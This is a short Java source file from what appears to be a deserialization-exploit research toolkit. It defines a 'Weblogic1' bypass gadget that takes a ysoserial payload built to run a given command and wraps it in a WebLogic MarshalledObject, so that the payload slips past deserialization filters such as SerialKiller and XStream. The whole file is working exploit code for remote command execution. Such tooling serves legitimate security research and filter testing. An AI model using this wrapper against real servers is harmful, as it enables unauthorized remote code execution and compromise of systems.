package serialkiller.bypass;

import weblogic.corba.utils.MarshalledObject;
import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.annotation.Dependencies;

/**
 * Created by alvaro on 08/04/16.
 */

@Dependencies({ "weblogic"} )
public class Weblogic1 implements BypassGadget {

    public Object wrapPayload(String command, Class payload_class) throws Exception {

        Object payload = ((ObjectPayload) payload_class.getConstructor().newInstance()).getObject(command);

        MarshalledObject obj = new MarshalledObject(payload);

        return obj;
    }

    public boolean bypassXStream() { return true; }
    public boolean skipTest() { return false; }
}
